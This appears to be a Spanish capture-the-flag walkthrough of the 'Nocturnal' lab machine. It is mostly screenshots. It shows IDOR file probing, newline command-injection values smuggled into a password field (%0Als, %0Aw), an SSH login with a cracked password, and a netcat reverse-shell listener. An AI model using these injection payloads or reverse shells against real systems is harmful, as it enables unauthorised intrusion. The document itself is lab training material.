...
![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414125324.png>)
...
![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414125512.png>)
...
![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414125528.png>)
...
![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414125734.png>)

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414125905.png>)

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414125937.png>)

>[!INFO]
>No es posible aplicar ningún tipo de bypass ni nada del estilo

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414130131.png>)

```bash
http://nocturnal.htb/view.php?username=usuarionoexiste&file=noexiste.pdf
```

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414130304.png>)

```bash
http://nocturnal.htb/view.php?username=test&file=noexiste.pdf
```

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414130312.png>)

```bash
http://nocturnal.htb/view.php?username=admin&file=noexiste.pdf
```

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414130327.png>)
...
![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414184039.png>)

```bash
http://nocturnal.htb/view.php?username=amanda&file=noexiste.pdf
```

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414131010.png>)
### Information Leakage \[Unintended Way]

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414131038.png>)

```bash
unzip privacy.odt
```

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414133532.png>)

### Downloading Backup

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414133709.png>)

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414133722.png>)

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414133856.png>)

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414133911.png>)
...
![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250502124641.png>)

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250502124605.png>)

```python
password=%0Als&backup
```

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250502124851.png>)

```python
password=%0Aw&backup
```

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250502125013.png>)
...
![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250502125135.png>)
...
![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250502130123.png>)
___
## Movimiento lateral de usuario
### Enumeración local

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250502130743.png>)

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414134135.png>)
### Cracking Hash
...
![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414134235.png>)

> [!INFO]
> **hashcat** o **johntheripper**
![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414134253.png>)

```bash
ssh tobias@nocturnal.htb # Password: slowmotionapocalypse
```

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414134425.png>)

___
## Escalada de privilegios
### Enumeración local

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414134541.png>)

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414135256.png>)

```bash
cat /proc/1004/cmdline | tr '\0' ' '; echo
```

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414135431.png>)
...
![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414134814.png>)
...
![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414180436.png>)
...
![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414183115.png>)
#### Automated
...
![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414173119.png>)

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414141102.png>)

**Reverse Shell** **NetCat** (`nc -nlvp 443`)

**Tratamiento de la TTY**

![](<../assets/images/posts/2025-05-29-nocturnal/Pasted image 20250414141231.png>)